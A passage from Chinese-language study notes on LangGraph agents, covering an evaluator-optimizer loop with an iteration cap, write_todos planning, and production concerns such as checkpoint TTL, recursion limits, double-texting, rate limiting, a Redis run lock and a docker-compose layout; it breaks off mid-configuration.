# 3. 用 with_structured_output 把 LLM 包成评估器，强制输出 Feedback 结构 🟢
evaluator = llm.with_structured_output(Feedback)

# 4. 生成器节点：有 feedback 带着改，没 feedback 首次生成
def llm_call_generator(state: State):
    if state.get("feedback"):                                       # 有反馈 -> 带反馈重生
        msg = llm.invoke(f"写个关于{state['topic']}的笑话，参考反馈：{state['feedback']}")
    else:                                                            # 无反馈 -> 首次生成
        msg = llm.invoke(f"写个关于{state['topic']}的笑话")
    return {"joke": msg.content, "iter_count": state.get("iter_count", 0) + 1}  # 计数+1

# 5. 评估器节点：用 structured output 产出 Feedback
def llm_call_evaluator(state: State):
    grade = evaluator.invoke(f"评价这个笑话：{state['joke']}")        # 强制结构化输出
    return {"funny_or_not": grade.grade, "feedback": grade.feedback}

# 6. 条件边函数：决定回环还是结束
def route_joke(state: State):
    if state.get("iter_count", 0) >= 5:        # 🟡 生产硬上限：自己加，官方示例没有
        return "Accepted"                       # 撞上限强制接受，避免死循环
    if state["funny_or_not"] == "funny":
        return "Accepted"                       # 评估通过 -> END
    elif state["funny_or_not"] == "not funny":
        return "Rejected + Feedback"            # 不通过 -> 回生成器

# 7. 组装 StateGraph
optimizer_builder = StateGraph(State)
optimizer_builder.add_node("llm_call_generator", llm_call_generator)      # 加生成器节点
optimizer_builder.add_node("llm_call_evaluator", llm_call_evaluator)      # 加评估器节点
optimizer_builder.add_edge(START, "llm_call_generator")                   # 入口 -> 生成器
optimizer_builder.add_edge("llm_call_generator", "llm_call_evaluator")    # 生成 -> 评估
optimizer_builder.add_conditional_edges(                                   # 评估后条件路由 🟢
    "llm_call_evaluator",
    route_joke,
    {
        "Accepted": END,                            # 通过 -> 结束
        "Rejected + Feedback": "llm_call_generator",# 不过 -> 回生成器（回环）
    },
)
optimizer_workflow = optimizer_builder.compile()    # 编译

# 8. 运行
state = optimizer_workflow.invoke({"topic": "猫", "iter_count": 0})
print(state["joke"])
```

逐行解释：
- 第1步 State：把 `joke`/`feedback`/`funny_or_not` 都放 state，让两个节点能读写。`iter_count` 是我加的生产字段 🟡，官方示例没有，但**没有它就死循环**。
- 第2-3步 Feedback + `with_structured_output`：🟢 官方核心 API。强制评估器输出结构化结果，这样条件边能程序化判断 `grade == "funny"`，而不是再让 LLM 解析自然语言。
- 第4步 `llm_call_generator`：🟢 官方逻辑——检查 `state.get("feedback")`，有就带反馈重生。这是反思循环的"改进"动作。
- 第5步 `llm_call_evaluator`：🟢 调评估器，写回 `funny_or_not` 和 `feedback`。
- 第6步 `route_joke`：🟢 官方条件函数。我加了 `iter_count >= 5` 的硬上限 🟡，这是生产必备，下面"生产注意"会讲。
- 第7步 `add_conditional_edges`：🟢 官方核心。`"Rejected + Feedback"` 映射回 `llm_call_generator` 形成回环——这就是"循环"的来源，StateGraph 允许边指回上游节点。
- 第8步 invoke：从 `START` 进入生成器，开始循环。

预判疑问：
- **Q: 这个循环和第15步讲的 Command 管走、interrupt 管停什么关系？** 🟡 evaluator-optimizer 用 `add_conditional_edges` 管走（条件路由），这是图结构层面的"走"。如果想在评估环节插入人工审核，可以用 `interrupt_before=["llm_call_generator"]` 暂停让人类决定是否接受——万物云就是这么做的（见万物云口径）。
- **Q: 评估器和生成器能用不同模型吗？** 🟡 能。生产里常见：生成器用强模型（贵、质量高），评估器用便宜快模型（只判断达标与否）。官方示例为了简洁用同一个 `llm`，但没限制必须相同。
- **Q: feedback 怎么进生成器的 prompt？** 🟢 官方就是字符串拼进 invoke 的 prompt 里（`f"...参考反馈：{state['feedback']}"`）。简单粗暴但有效。

---

#### 生产注意（坑 + 对策）

| 坑 | 表现 | 对策 | 来源 |
|---|---|---|---|
| **规划膨胀** | LLM 一上来写 30 个 todo，实际 5 个就够，每步都花 token 更新清单 | system prompt 限定"最多 5-7 项，每项可执行"；或给 write_todos 加上限 | 🟡 通用经验 |
| **规划不更新** | 模型写了清单后再也不调 write_todos 更新状态，清单成摆设 | system prompt 强制"每完成一项立刻更新"；监控 todo 状态变化频率 | 🟡 通用经验 |
| **反思死循环** | evaluator 永远返回 not funny，无限回环直到 recursion_limit | state 加 `iter_count`，超阈值强制 Accepted；或设分数阈值（评分>=0.8 就过） | 🟡 通用经验，🟢 recursion_limit 是框架兜底 |
| **规划质量差** | 拆错顺序/漏关键步骤，agent 按错清单走到底 | 关键节点加人工审核（interrupt_before）；高价值任务人审第一版清单 | 🟢 万物云用 interrupt_before |
| **成本爆炸** | 每轮反思多一次 LLM 调用，5 轮就是 10 次调用 | 评估器用便宜模型；非关键任务关闭反思直接一锤子 | 🟡 通用经验 |
| **何时停没定义** | 没有"达标"的明确标准，evaluator 不知该不该 Accept | Feedback schema 里加明确的量化标准（如"必须包含X、字数Y、无Z"） | 🟡 通用经验 |
| **write_todos 字段名不确定** | 官方没给完整 schema，自己猜字段名可能和实际不符 | 查 deepagents 源码或 reference 页确认；本步伪代码字段名🔴待核 | 🔴 待核 |

---

#### 后端类比（Agent概念 | 后端类比 | 说明）

| Agent概念 | 后端类比(Spring/Activiti/Redis/JUC) | 说明 |
|---|---|---|
| write_todos 任务清单 | Activiti 的 `List<Task>` 用户任务列表 | 都是"显式记录待办项+状态"，Activiti 的 UserTask 有 pending/completed 状态，write_todos 的 status 枚举同理 🟡 |
| TodoListMiddleware 持久化在 state | Activiti 任务表持久化在 ACT_RU_TASK 表 | 跨步骤不丢=Activiti 流程实例的任务跨节点不丢 🟡 |
| status: pending→in_progress→completed | Activiti Task 状态机 / JUC Future 的状态 | 都是显式状态机推进 🟡 |
| evaluator-optimizer 循环 | Spring Retry + 断言重试：`@Retryable` + 判断结果不达标就重试 | 生成→评估→不过就带反馈重试，和 Spring Retry 的 maxAttempts+回退策略同构 🟡 |
| `with_structured_output(Feedback)` | Spring 的 `ResponseEntity<FeedbackDTO>` 强类型返回 | 强制结构化输出=强类型返回，避免解析自然语言 🟡 |
| `add_conditional_edges` 回环 | Activiti 的条件网关 + 连线指回上游节点 | StateGraph 允许边指回上游=Activiti 允许 sequenceFlow 指回已执行节点（虽然 Activiti 显式回环少见，多用多实例） 🟡 |
| `iter_count` 硬上限 | Spring Retry 的 `maxAttempts` | 防死循环的硬上限，必须显式设 🟡 |
| recursion_limit 框架兜底 | Tomcat 的 maxThreads 兜底 / 线程池的拒绝策略 | 框架层面的最后防线，业务层不该依赖它 🟡 |
| planning + 反思组合 | Spring Batch 的 Step（规划）+ ItemProcessor 重试（反思） | Step 拆任务顺序，每个 Item 处理时重试达标 🟡 |
| 评估器用便宜模型 | 主流程用强依赖，校验用轻量校验器（如 Bean Validation） | 重活用重引擎，校验用轻量组件 🟡 |

---

#### 万物云口径（按真实，三色标注，没明确说的标🔴不编）

- **万物云没用 Deep Agents**（用 StateGraph + create_agent 自建）🟢（已确认立场）
- **万物云没用 write_todos** 🔴（万物云没明确说用了 Deep Agents 的 write_todos 工具。万物云既然没用 Deep Agents，自然没有 TodoListMiddleware/write_todos。不编造）
- **万物云的规划靠 StateGraph 图结构（确定性编排）** 🟡（基于"万物云用 StateGraph + create_agent"的事实推断：任务拆解和顺序由 StateGraph 的节点+边显式定义，是确定性编排，而不是让 LLM 自主维护 todo list。源文档没明确说"规划靠图结构"，这是推断）
- **万物云的反思靠人工审核 interrupt_before** 🟢（万物云用 interrupt_before 做人工审核，已确认。人工审核本质就是"人当 evaluator"——生成的中间结果暂停给人审，人给反馈（通过/打回），不通过就回上游重做。这就是 evaluator-optimizer 的 human-in-the-loop 变体，官方原文也说 evaluator 可以是 "a human-in-the-loop" 🟢）
- **万物云的 recursion_limit = 25（框架内置兜底）** 🟢，口径："用框架自带的兜底并调了阈值"。反思循环如果用图回环实现，25 是硬上限
- **万物云有没有用 LLM 自评的 evaluator-optimizer 循环？** 🔴（待核。源文档没明确说万物云实现了 LLM 自评的自动反思循环。已确认的是人工审核 interrupt_before，这是"人评"。LLM 自评循环是否用了，没明确说，不编）
- **万物云的规划质量怎么保证？** 🟡（推断：既然规划靠 StateGraph 图结构，图结构是人设计的，规划质量=图设计质量。关键节点加 interrupt_before 人工审核，是对图设计的补充校验。源文档没明确说"规划质量靠图设计+人工审核"，这是基于已知事实的推断）

万物云组合定位（🟡推断 + 🟢确认）：
- 规划层 = StateGraph 图结构（确定性，人设计）🟡 + 关键节点人工审核 🟢
- 反思层 = interrupt_before 人工审核（人当 evaluator）🟢
- 没有用 write_todos 这种"LLM 自主维护清单"的轻量规划 🔴
- 没有用 LLM 自评的自动 evaluator-optimizer 循环 🔴（没明确说，不编）

**对比 Deep Agents 的差异**：Deep Agents 让 LLM 自己规划（write_todos，自主、灵活但不可控），万物云让人规划（StateGraph 图结构，确定、可控但不灵活）。这是两种哲学的取舍——万物云场景（物业/资产运营）对可控性要求高，所以选了确定性编排 + 人工审核，而不是让 LLM 自主拆任务。

---

#### 第31步检查题（5道，含预判疑问）

**题1**：`write_todos` 工具是由哪个中间件提供的？它在 Deep Agents 默认中间件栈里排第几个？为什么排这个位置？

预判疑问：为什么规划中间件要排在 FilesystemMiddleware 和 SubAgentMiddleware 之前？
> 参考答案：由 `TodoListMiddleware` 提供 🟢。它是默认栈的**第一个**中间件 🟢（来源：deepagents customization 页 "Default stack (main agent)"）。排在最前是因为规划是地基能力——agent 在调用文件系统、派生子 agent 之前，应该先知道"自己要做什么、做到哪一步了"，清单先于动作。类比：Activiti 流程实例启动时先加载任务列表，再执行具体任务节点。

**题2**：evaluator-optimizer 工作流里，循环是怎么形成的？用哪几个 API 实现"评估不过就回生成器"？请说出条件边的映射结构。

预判疑问：StateGraph 不是 DAG 吗，怎么会有环？
> 参考答案：循环通过 `add_conditional_edges` 把评估器节点的某条分支指回生成器节点形成 🟢。三件套 API：`llm.with_structured_output(Feedback)`（结构化评估）+ `add_conditional_edges`（条件路由）+ `StateGraph`（允许边指回上游，不是严格 DAG）。条件边映射：`{"Accepted": END, "Rejected + Feedback": "llm_call_generator"}` 🟢。StateGraph 允许回环边，这是它和纯 DAG 工作流引擎的区别——LangGraph 靠 recursion_limit 兜底防止无限循环。

**题3**：反思循环如果 evaluator 永远返回 "not funny"，会死循环吗？官方示例有没有防死循环？生产里你该怎么加保护？

预判疑问：recursion_limit 是不是就够用了？
> 参考答案：会死循环。官方示例**没有**显式防死循环（🟢 官方示例代码里 route_joke 只看 funny_or_not，没有迭代上限）。框架层面的 `recursion_limit` 是兜底（撞限报错），但生产不能靠它——它是异常退出不是正常结束。生产做法：在 state 里加 `iter_count` 计数器，route_joke 里判断 `iter_count >= max_iterations` 就强制返回 "Accepted"；或用评分阈值（评分>=0.8 就 Accept）🟡。万物云的 recursion_limit=25 🟢 是框架兜底，业务层还应该有自己的 max_iterations。

**题4**：万物云的"反思"机制是什么？它和 Deep Agents 的 evaluator-optimizer 有什么本质区别？

预判疑问：人工审核算反思吗？反思不是应该 LLM 自己评自己吗？
> 参考答案：万物云的反思靠 `interrupt_before` 人工审核 🟢——生成的中间结果暂停给人审，人当 evaluator，通过就继续、不通过给反馈回上游重做。这本质是 evaluator-optimizer 的 human-in-the-loop 变体，官方原文也明确说 evaluator 可以是 "a human-in-the-loop" 🟢。区别：Deep Agents 的 evaluator-optimizer 是 LLM 自评（自动、快、但评估质量受模型能力限制）；万物云是人评（慢、需要人介入、但评估质量高且可控）。万物云场景对可控性要求高，所以选人评。万物云有没有用 LLM 自评循环🔴没明确说，不编。

**题5**：你要给一个"研究并生成报告"的 agent 同时加 planning 和反思。用 Deep Agents 的 write_todos + LangGraph 的 evaluator-optimizer，该怎么组合？write_todos 的清单和 evaluator-optimizer 的循环谁先谁后？

预判疑问：能不能每个 todo 项都走一次反思循环？
> 参考答案：组合方式——主 agent 先调 `write_todos` 把研究任务拆成清单（搜索→抓取→对比→写报告），逐项执行 🟢。反思循环放在"写报告"这一项的内部：报告生成后走 evaluator-optimizer，评估报告质量不达标带反馈重写，达标再标 completed 🟡。顺序是"先规划后反思、反思嵌套在单项执行内"——write_todos 管"做什么顺序"（宏观），evaluator-optimizer 管"这一项做得够不够好"（微观）。每个 todo 项都可以走一次反思循环，但成本会指数级涨，生产里只在关键项（如最终报告）加反思，中间步骤（如搜索）一锤子即可 🟡。这种组合🔴官方没有现成示例，是基于组件能力的推断组合。

---

**本步核实来源汇总**（🟢官方抓到）：
- `deepagents_overview.txt`：write_todos 工具定义、status 枚举、持久化在 state、属于 Delegation 组件的 Task planning
- `deepagents_customization.txt`：TodoListMiddleware 是默认栈第一个中间件、官方描述 "Tracks and manages todo lists"
- `deepagents_tools.txt`：write_todos 是内置 harness 工具，描述 "Manage a structured todo list"
- `workflows_agents_text.txt`：evaluator-optimizer 模式原文、API（with_structured_output + add_conditional_edges + StateGraph）、循环结构
- `agent_pattern_reflection.txt` / `agent_pattern_reflexion.txt`：确认 Reflection/Reflexion 无独立官方页，evaluator-optimizer 是等价物，Reflexion 跨 trial 记忆官方无

**🔴 未核实（不编）**：
- write_todos 的完整参数 schema（字段名，除 status 外）
- 万物云是否用了 LLM 自评的自动反思循环
- planning + 反思组合的官方现成示例

---

### 第32步：部署生产化（并发/限流/容错/checkpointer膨胀）
> Agent 从 demo 跑通到上生产，必须解决的五大工程化问题：checkpointer 存储膨胀、递归爆栈、并发隔离、限流容错、部署架构。🟢 官方文档确认（Agent Server / Checkpointers / TTL / Double-texting / Scale / Rate Limiting 页）🔴 万物云推断待核

#### 为什么重要（痛点先讲）

你在第1-25步已经把 LangGraph 心智模型、Command/interrupt、multi-agent、上下文工程都学完了。但 demo 跑通 ≠ 生产能跑。上生产你会撞上这五面墙：

**痛点1：checkpointer 存储爆炸。** LangGraph 每个 super-step 存一个 checkpoint 快照。一个 20 轮对话的 thread，就是 20+ 个 checkpoint，每个都存全量 state（包括所有 messages）。1000 个用户 × 每天 10 个 thread × 20 步 = 每天 20 万条 checkpoint。Postgres 磁盘一周爆。🟢 官方文档原文："Over long conversations, checkpoints accumulate. This can increase latency and storage costs."（来源：persistence 页 Troubleshooting）

**痛点2：递归爆栈。** Agent 在 model→tool→model 循环里卡死（tool 报错→model 重试→又报错→又重试），如果没有步数上限，这个循环永远跑下去，烧 token 烧到天亮。🟢 Pregel 官方文档原文："Repeat until no actors are selected for execution, or a maximum number of steps is reached."（来源：pregel 页）

**痛点3：并发写冲突。** 同一个 thread_id，用户连发两条消息，两个 run 同时改同一份 state，checkpoint 互相覆盖，状态撕裂。这跟你 Spring 里两个线程同时改同一个 ProcessInstance 是一个道理。

**痛点4：LLM 限流被打爆。** 高并发下你的 Agent 同时发 100 个请求给 OpenAI/Anthropic，API 返回 429，你的 Agent 全线崩溃。

**痛点5：部署架构散架。** API 接请求、Worker 跑 graph、Postgres 存 checkpoint、Redis 做 pubsub——四个组件怎么编排？怎么扩容？怎么灰度？demo 里一个 `graph.invoke()` 全搞定，生产里你要拆。

#### 概念（是啥）

部署生产化 = 把 Agent 从"单进程 invoke 跑通"变成"多组件分布式系统稳定运行"，核心五件事：

| 维度 | 是啥 | 一句话 |
|------|------|--------|
| **checkpointer 膨胀控制** | TTL + DeltaChannel + durability 降级 | 给快照设过期时间，别让磁盘爆 |
| **recursion_limit 防爆栈** | 框架内置步数上限 | 跑超过 N 步就抛异常，止损 |
| **并发隔离** | thread_id 维度串行 + double-texting 策略 | 同一个 thread 同时只跑一个 run |
| **限流容错** | RateLimiter + retry + max_concurrency | 客户端限流 + 指数退避 + 并发上限 |
| **部署架构** | API server + Queue worker + Postgres + Redis | 接请求的和跑graph的分开，各自扩容 |

#### 深入（机制/原理，带三色）

**1. checkpointer 膨胀控制（三层防线）**

🟢 官方文档确认（checkpointers 页 + configure-ttl 页 + persistence 页）

第一层：**durability 降级**。LangGraph 三种持久化模式，从轻到重：

- `"exit"`：只在 graph 执行结束（成功/失败/interrupt）时存一次。中间步骤不存。性能最好，但进程崩了中间状态全丢，不能恢复。适合短任务。
- `"async"`（默认）：每个 super-step 异步存 checkpoint。下一步开始执行时，上一步的 checkpoint 在后台写。性能好，但进程崩在"写 checkpoint 之前"的那个窗口，会丢最后一步。
- `"sync"`：每个 super-step 同步存 checkpoint，写完了才开始下一步。最安全，最慢。

```python
# 🟢 官方文档原文（checkpointers 页 Durability modes）
graph.stream({"input": "test"}, durability="sync")  # 同步存，最安全
graph.stream({"input": "test"}, durability="async") # 默认，异步存
graph.stream({"input": "test"}, durability="exit")  # 只存最终结果
```

**关键点**：默认 `async` 是性能和安全的折中。如果你只关心最终结果（比如一次性批处理），用 `exit` 能减少 90% 的 checkpoint 写入量。

第二层：**TTL 自动清理**。🟢 官方文档确认（configure-ttl 页）

在 `langgraph.json` 里配 checkpointer TTL：

```json
{
  "checkpointer": {
    "ttl": {
      "strategy": "delete",           // "delete"=删整个thread | "keep_latest"=只留最新checkpoint
      "sweep_interval_minutes": 60,    // 每60分钟扫一次过期数据
      "default_ttl": 43200             // 43200分钟=30天，新thread创建后30天自动删
    }
  }
}
```

- `strategy="delete"`：TTL 到了，整个 thread + 所有 checkpoint + 所有 run 一起删。
- `strategy="keep_latest"`：保留 thread 和最新 checkpoint，删掉旧的历史 checkpoint（time travel 用的那些）。适合需要保留当前对话但不需要回溯历史的场景。
- `sweep_interval_minutes`：后台 sweeper 的扫描间隔，默认 5 分钟。
- `default_ttl`：thread 的存活分钟数。不设就不过期。
- `sweep_limit`：sweeper 每次迭代处理多少个 thread，默认 10000（v0.12+）。

**预判疑问：TTL 对已有的旧 thread 生效吗？**
🟢 官方文档原文："TTLs are applied to threads and checkpoints when they are created. They do not apply to existing threads and checkpoints. To clear older data, delete it explicitly."——**不生效**。TTL 只对配置部署后新创建的 thread 生效。老数据要手动删。

**预判疑问：能不能每个 thread 设不同 TTL？**
🟢 能。per-thread TTL：
```python
# 🟢 官方文档原文（configure-ttl 页）
thread = await client.threads.create(
    ttl={"strategy": "delete", "ttl": 43200}  # 这个thread 30天后删
)
```

第三层：**DeltaChannel**（beta）。🟢 官方文档确认（checkpointers 页 Optimize checkpoint storage）

传统 checkpoint 每个 super-step 存全量 state。一个 messages 列表有 100 条消息，每个 checkpoint 都存这 100 条。20 个 checkpoint = 存 20 份 100 条。

DeltaChannel 只存增量 delta（新增的那条消息），不是全量。重建 state 时回放 ancestor writes。checkpoint 从 O(N) 降到 O(1)。

```python
# 🟢 官方文档原文（checkpointers 页）
# DeltaChannel requires langgraph>=1.2, currently in beta
# 用 Annotated 标注 channel 为 delta 类型
from langgraph.channels import DeltaChannel
```

**坑**：DeltaChannel 是 beta，API 可能变。剪枝（prune）时不能删 delta chain 依赖的 write rows，否则 state 重建为空。如果你还没上线，先用 TTL；DeltaChannel 等正式版。

**2. recursion_limit 防递归爆栈**

🟢 机制确认（pregel 页）："Repeat until no actors are selected for execution, or a maximum number of steps is reached."
🟢 默认值 25（框架内置兜底，万物云口径确认）

LangGraph 的 Pregel 运行时在每个 super-step 执行一批 node。如果 graph 有环（agent loop: model_node → should_continue → tool_node → model_node），就会一直转。`recursion_limit` 是这个循环的步数上限。

- 默认值 25（super-step 数）。超过就抛 `GraphRecursionError`。
- 这是**框架内置兜底**，不是你要手动配的。但你可以调：
  ```python
  graph.invoke(input, config={"recursion_limit": 50})  # 调高到50步
  ```

**预判疑问：25 步够吗？**
取决于你的 agent loop。一次 model call + 一次 tool call = 2 个 super-step。25 步 ≈ 12 轮 tool 调用。对大多数对话够。如果你的 agent 要跑长链推理（比如 20 步搜索），调到 50。万物云口径："用框架自带的兜底并调了阈值"🟢。

**预判疑问：recursion_limit 和 max_concurrency 什么关系？**
没关系。`recursion_limit` 管**纵向深度**（一个 run 跑多少步），`max_concurrency` 管**横向并发**（同时跑多少个 run/evaluation）。一个防爆栈，一个防限流。

**3. 并发隔离（thread_id 维度串行 + double-texting）**

🟢 官方文档确认（agent-server 页 + double-texting 页）

核心规则：🟢 "The queue enforces that at most 1 run can be executed for a given thread at one time."（agent-server 页）——同一个 thread_id，同时只能有一个 run 在跑。这跟你 Activiti 里同一个 processInstanceId 同时只能有一个 execution 在推进是一个道理。

但如果用户在第一个 run 还没跑完时又发了消息（"double texting"），怎么办？四种策略：

| 策略 | 行为 | 类比 | 返回 |
|------|------|------|------|
| **enqueue**（默认）🟢 | 第一个 run 跑完后，第二个 run 排队接着跑 | BlockingQueue.put() | 200，排队 |
| **reject** 🟢 | 直接拒绝第二个 run，第一个继续跑 | ReentrantLock.tryLock() 失败 | **409 Conflict** 🟢 |
| **interrupt** 🟢 | 暂停第一个 run（保留进度），插入第二个 run，跑完再恢复第一个 | Thread.interrupt() + 保存现场 | 200 |
| **rollback** 🟢 | 回滚第一个 run 的所有进度，用第二个 run 的输入从头跑 | transaction.rollback() + 重新开始 | 200 |

**预判疑问：这四个策略是 OSS LangGraph 的还是 Agent Server 的？**
🟢 官方文档原文："Double texting is a feature of LangSmith Deployment. It is not available in the LangGraph open source framework."（double-texting 页）——**是 Agent Server 的功能，不是 OSS LangGraph 的**。如果你不用 LangSmith Agent Server 自托管，这四个策略你没有，你得自己实现（比如用 Redis 分布式锁）。

**预判疑问：万物云用这四个策略吗？**
🔴 待核/不编。万物云自托管，concurrent-run 的 hard protection 是自己加 Redis 锁（🔴 推断）。如果万物云没用 LangSmith Agent Server，那这四个策略它没有，它用自己的 Redis 锁实现"reject"等价语义。这点没明确说，标🔴。

**4. 限流容错**

🟢 官方文档确认（handle-model-rate-limiting 页）

三种手段，从客户端到服务端：

**手段A：RateLimiter 客户端限流**（Python only）
```python
# 🟢 官方文档原文
from langchain_core.rate_limiters import InMemoryRateLimiter

rate_limiter = InMemoryRateLimiter(
    requests_per_second=0.1,      # 每10秒才发1个请求
    check_every_n_seconds=0.1,    # 每100ms检查一次是否允许
    max_bucket_size=10,           # 令牌桶最大10个burst
)
model = init_chat_model("gpt-5.5", rate_limiter=rate_limiter)
```
这是令牌桶算法，跟 Sentinel/Guava RateLimiter 一模一样。

**手段B：指数退避重试**
```python
# 🟢 官方文档原文
model_with_retry = init_chat_model("gpt-5.4-mini").with_retry(stop_after_attempt=6)
```
6次重试，指数退避。跟 Spring Retry `@Retryable(maxAttempts=6, backoff=@Backoff(delay=1000, multiplier=2))` 一样。

**手段C：max_concurrency 并发上限**
```python
# 🟢 官方文档原文（evaluation 场景）
results = await aevaluate(..., max_concurrency=4)  # 最多4个并发
```
限制同时发出去的请求数，从源头避免打爆 API。

**5. 部署架构**

🟢 官方文档确认（agent-server 页 Runtime architecture）

三种部署模式，从小到大：

| 模式 | 结构 | 适用场景 |
|------|------|----------|
| **Single host** 🟢 | API server 自己管 queue，没有独立 queue worker | 开发 / 低流量 |
| **Split API and queue** 🟢 | API server 和 queue worker 分开部署，各自扩容 | 自托管生产 |
| **Distributed runtime** 🟢 | 编排和执行分两个进程 | 大规模高并发 |

容器架构（Split 模式）：

```
User → API Server（接请求，不跑graph代码）
         ↓ create run
       Postgres（存 run/thread/checkpoint）
         ↓ notify
       Redis（pubsub，存 ephemeral run 信号）
         ↓ wake
       Queue Worker（跑graph代码，写checkpoint）
         ↓ publish events
       Redis → API Server → SSE → User
```

🟢 关键点：
- API server 和 Queue worker 是**同一 Docker image**，不同启动命令。
- 容器是 **stateless** 的。扩容缩容不丢数据（数据全在 Postgres + Redis）。
- 至少 1 个 queue worker 必须活着，否则 run 会被 orphan。
- `N_JOBS_PER_WORKER` 默认 10：一个 worker 容器同时跑 10 个 run。
- `available_jobs = number_of_queue_workers × N_JOBS_PER_WORKER` 🟢
- `throughput_per_second = available_jobs / average_run_execution_time_seconds` 🟢

**预判疑问：Redis 存什么？**
🟢 官方文档原文："Redis handles the storage of ephemeral data about on-going runs" + "Redis handles signaling, cancellation, and streaming pub/sub between API servers and queue workers. It stores only ephemeral data-no user or run data persists in Redis."——Redis 只存 ephemeral 信号（run 状态、pubsub 消息），**不存用户数据**。用户数据全在 Postgres。

#### 生产实战（伪代码 + 逐行解释，每行注释）

**实战1：langgraph.json 生产配置（TTL + checkpointer）**

```json
// langgraph.json — Agent Server 部署配置文件
{
  // 声明依赖，告诉 Agent Server 去哪找 graph 代码
  "dependencies": ["."],
  
  // 注册 graph：key="agent" 是 assistant_id，value 是 graph 对象路径
  "graphs": {
    "agent": "./agent.py:graph"  // agent.py 文件里的 graph 变量
  },
  
  // checkpointer TTL 配置 — 防止 checkpoint 存储爆炸 🟢
  "checkpointer": {
    "ttl": {
      "strategy": "delete",            // 过期策略：删整个 thread（含所有 checkpoint + run）
      "sweep_interval_minutes": 60,    // 后台 sweeper 每 60 分钟扫一次
      "default_ttl": 43200             // 新 thread 存活 43200 分钟 = 30 天
    }
  },
  
  // store TTL 配置 — 长期记忆过期 🟢
  "store": {
    "ttl": {
      "refresh_on_read": true,         // 读操作(get/search)会刷新 TTL，活跃记忆不过期
      "sweep_interval_minutes": 120,   // 每 120 分钟扫一次
      "default_ttl": 10080             // store item 存活 10080 分钟 = 7 天
    }
  }
}
```

**实战2：限流中间件（InMemoryRateLimiter + retry）**

```python
# rate_limit_setup.py — 给 model 套上限流 + 重试两层保护
from langchain.chat_models import init_chat_model
from langchain_core.rate_limiters import InMemoryRateLimiter

# 第一层：令牌桶限流 — 控制发往 LLM provider 的请求速率 🟢
rate_limiter = InMemoryRateLimiter(
    requests_per_second=2.0,          # 每秒最多 2 个请求（按你的 API quota 设）
    check_every_n_seconds=0.1,        # 每 100ms 检查令牌桶
    max_bucket_size=10,               # 令牌桶上限 10，允许短时 burst 10 个并发
)
# 类比：Guava RateLimiter.create(2.0) + Semaphore(10)

# 第二层：指数退避重试 — 429 时自动重试 🟢
model = init_chat_model(
    "anthropic:claude-sonnet-4-6",
    rate_limiter=rate_limiter,         # 挂上限流器
).with_retry(
    stop_after_attempt=5,              # 最多重试 5 次
    # tenacity 风格：指数退避，1s → 2s → 4s → 8s → 16s
)
# 类比：Spring @Retryable(maxAttempts=5, backoff=@Backoff(delay=1000, multiplier=2))

# 用这个 model 创建 agent
from langchain.agents import create_agent
agent = create_agent(
    model=model,                        # 带 limit + retry 的 model
    tools=[search_tool, fetch_tool],
)
```

**实战3：Redis 分布式锁（自托管 concurrent-run 保护）**

```python
# redis_concurrent_lock.py — 万物云自托管场景：同一 thread 同时只跑一个 run
# 🔴 万物云 concurrent-run hard protection 未核实 -> 自托管加自己 Redis 锁
import redis
import uuid
import time

# 连接 Redis（跟 Spring RedisTemplate 同一个 Redis 实例）
redis_client = redis.Redis(host='redis-host', port=6379, db=0)

def acquire_thread_lock(thread_id: str, timeout: int = 300) -> str | None:
    """
    获取 thread 维度的分布式锁。
    返回 lock_token（成功）或 None（失败，说明该 thread 有 run 在跑）。
    类比：Redisson RLock.tryLock(thread_id, 300, TimeUnit.SECONDS)
    """
    lock_key = f"agent:run:lock:{thread_id}"  # lock key 带 thread_id 维度
    lock_token = str(uuid.uuid4())             # 唯一 token，防误解锁
    
    # SET NX EX：不存在才设置，300秒自动过期（防死锁）🟡 通用 Redis 模式
    acquired = redis_client.set(
        lock_key, 
        lock_token, 
        nx=True,        # Only set if not exists — 原子操作
        ex=timeout      # 过期时间 300s（run 最大执行时间），超时自动释放
    )
    
    if acquired:
        return lock_token   # 拿到锁
    else:
        return None         # 该 thread 有 run 在跑，拒绝（等价 reject 409）

def release_thread_lock(thread_id: str, lock_token: str) -> bool:
    """
    释放锁。用 Lua 脚本保证"检查 token + 删除"是原子操作。
    类比：Redisson RLock.unlock() 内部也是 Lua CAS
    """
    # Lua 脚本：先比对 token，匹配才删，防误解锁 🟡 通用 Redis 模式
    lua_script = """
    if redis.call("get", KEYS[1]) == ARGV[1] then
        return redis.call("del", KEYS[1])
    else
        return 0
    end
    """
    result = redis_client.eval(
        lua_script, 
        1,                          # key 数量
        f"agent:run:lock:{thread_id}",  # KEYS[1]
        lock_token                  # ARGV[1]
    )
    return result == 1

# —— 生产调用流程 ——
def handle_user_message(thread_id: str, user_input: str):
    """处理用户消息，带 concurrent-run 保护"""
    
    # 1. 获取 thread 锁
    lock_token = acquire_thread_lock(thread_id, timeout=300)
    if lock_token is None:
        # 等价 Agent Server 的 reject 策略（409 Conflict）🟢
        return {"error": "该会话正在处理中，请稍后再试", "code": 409}
    
    try:
        # 2. 拿到锁，执行 agent
        #    recursion_limit 用框架默认 25 🟢，按需调高
        config = {
            "configurable": {"thread_id": thread_id},
            "recursion_limit": 25      # 🟢 框架内置兜底，万物云调了阈值
        }
        result = agent.invoke(
            {"messages": [{"role": "user", "content": user_input}]},
            config=config
        )
        return result
        
    finally:
        # 3. 无论成功失败，释放锁（try-finally 保证不漏释放）
        release_thread_lock(thread_id, lock_token)
```

**实战4：部署架构（docker-compose 伪代码）**

```yaml
# docker-compose.yml — Split API and queue 模式 🟢
version: "3.8"

services:
  # —— API Server：接 HTTP 请求，不跑 graph 代码 ——
  api-server:
    image: my-agent-app:latest         # 跟 worker 同一个 image
    command: ["langgraph-api"]         # 启动命令：API 模式
    environment:
      - REDIS_URL=redis://redis:6379
      - POSTGRES_URI=postgresql://user:pass@postgres:5432/langgraph
      - N_JOBS_PER_WORKER=10           # 🟢 默认 10
    deploy:
      replicas: 3                      # 3 个 API 容器（按读 QPS 扩）
    depends_on: [postgres, redis]

  # —— Queue Worker：跑 graph 代码，写 checkpoint ——
  queue-worker:
    image: my-agent-app:latest         # 同一个 image
    command: ["langgraph-queue-worker"] # 启动命令：Worker 模式
    environment:
      - REDIS_URL=redis://redis:6379
      - POSTGRES_URI=postgresql://user:pass@postgres:5432/langgraph
      - N_JOBS_PER_WORKER=20           # IO bound，调高到 20 🟢
    deploy:
      replicas: 5                      # 5 个 worker（available_jobs = 5×20 = 100）
    depends_on: [postgres, redis]

  # —— Postgres：存所有持久数据（thread/run/checkpoint/store）——
  postgres:
    image: postgres:16
    environment:
      - POSTGRES_DB=langgraph
      - POSTGRES_USER=user
